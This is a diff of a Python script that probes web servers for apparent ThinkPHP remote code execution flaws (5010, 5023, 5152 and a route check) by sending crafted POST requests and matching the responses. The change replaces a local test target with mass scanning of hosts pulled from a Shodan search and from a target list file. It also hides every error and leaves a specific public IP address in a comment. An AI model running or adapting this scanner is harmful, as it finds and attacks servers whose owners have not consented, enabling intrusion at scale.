@@ -1,4 +1,4 @@
-import re
+
 import requests
 from shodan import Shodan
 
@@ -17,39 +17,37 @@ headers = {
 
 def check_route(url):
     r = requests.get(url+data_route,headers=headers,timeout=1)
-    result = re.search(r"path=",r.text.replace(" ",""),re.I)
-    if result:
+    s = r.text.replace(" ","").lower()
+    if "path=" in s and "user" in s:
         print(url,"route Vulnerable")
     else:
-        print(url,"route Not Vulnerable")
+        print(url,"checked")
 
 
-def check5010(url):
-    
+def check5010(url):   
     r = requests.post(url+"/index.php?s=index/index/index/",data=data_5010,headers=headers,timeout=1)
-    result = re.search(r"path=",r.text.replace(" ",""),re.I)
-    if result:
+    s = r.text.replace(" ","").lower()
+    if "path=" in s and "user" in s:
         print(url,"5010 Vulnerable")
     else:
-        print(url,"5010 Not Vulnerable")
+        print(url,"checked")
 
 def check5023(url):
-    
     r = requests.post(url+"/index.php?s=captcha",data=data_5023,headers=headers,timeout=1)
-    result = re.search(r"path=",r.text.replace(" ",""),re.I)
-    if result:
+    s = r.text.replace(" ","").lower()
+    if "path=" in s and "user" in s:
         print(url,"5023 Vulnerable")
     else:
-        print(url,"5023 Not Vulnerable")
+        print(url,"checked")
         
 
 def check5152(url):
     r = requests.post(url+"/index.php",data=data_5152,headers=headers,timeout=1)
-    result = re.search(r"path=",r.text.replace(" ",""),re.I)
-    if result:
+    s = r.text.replace(" ","").lower()
+    if "path=" in s and "user" in s:
         print(url,"5152 Vulnerable")
     else:
-        print(url,"5152 Not Vulnerable")
+        print(url,"checked")
     
 def apicheck():  
     api = Shodan('key')
@@ -62,10 +60,15 @@ def apicheck():
                 url = "http://" + result['ip_str']
                 try:
                     checkall(url)
-                except Exception as e:
-                    print(e)  
-    except Exception as e:
-        print('Error: {}'.format(e))
+                except:pass  
+    except:pass
+
+def filecheck():
+    for line in open("./Desktop/dd.txt","r"):
+        line = line.strip("\r\n")
+        try:
+            checkall("http://"+line)
+        except:pass
 
 def checkall(url):
     check5010(url)
@@ -74,5 +77,7 @@ def checkall(url):
     check_route(url)
 
 if __name__ == "__main__":
-    #apicheck()
-    checkall("http://127.0.0.1/tp511/public")
+    apicheck()
+    #filecheck()
+    #checkall("http://119.29.239.197 ")
+    
